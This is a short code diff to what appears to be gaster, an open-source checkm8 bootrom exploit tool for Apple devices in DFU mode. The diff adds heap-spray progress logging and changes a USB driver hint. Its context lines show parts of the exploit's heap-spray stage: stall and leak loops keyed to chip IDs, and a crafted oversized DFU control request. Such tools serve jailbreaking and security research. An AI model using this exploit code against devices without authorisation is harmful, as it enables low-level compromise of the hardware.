@@ -796,7 +796,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 		static bool serial_fail_logged = false;
 		if(!serial_fail_logged) {
 			serial_fail_logged = true;
-			LOG_WARN("DFU device present but serial read failed -> driver issue; replace DFU driver with WinUSB (Zadig)");
+			LOG_WARN("DFU device present but serial read failed -> driver issue; install the libusbK driver (Zadig) for 'Apple Mobile Device (DFU Mode)'");
 		}
 	}
 	return ret;
@@ -885,16 +885,21 @@ checkm8_stage_spray(const usb_handle_t *handle) {
 
 	if(config_large_leak == 0) {
 		if(cpid == 0x7001 || cpid == 0x7000 || cpid == 0x7002 || cpid == 0x8003 || cpid == 0x8000) {
+			LOG_INFO("heap spray: waiting for stall+leak state (no output until it lands is normal)");
 			while(!checkm8_usb_request_stall(handle) || !checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
 		} else {
+			LOG_INFO("heap spray: forcing stall");
 			checkm8_stall(handle);
 			for(i = 0; i < config_hole; ++i) {
+				LOG_INFO("heap spray: no-leak hole %u/%u", (unsigned)(i + 1), (unsigned)config_hole);
 				while(!checkm8_no_leak(handle)) {}
 			}
+			LOG_INFO("heap spray: waiting for leak state (no output until it lands is normal)");
 			while(!checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
 		}
 		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1, NULL);
 	} else {
+		LOG_INFO("heap spray: waiting for %u stall events (no output until it lands is normal)", (unsigned)config_large_leak);
 		for(i = 0; i < config_large_leak; ++i) {
 			while(!checkm8_usb_request_stall(handle)) {}
 		}
@@ -1059,6 +1064,7 @@ gaster_checkm8(usb_handle_t *handle) {
 				ret = checkm8_stage_setup(handle);
 				stage = STAGE_SPRAY;
 			} else if(stage == STAGE_SPRAY) {
+				LOG_INFO("Triggering the heap spray (this can take a while)");
 				ret = checkm8_stage_spray(handle);
 				stage = STAGE_PATCH;
 			} else {
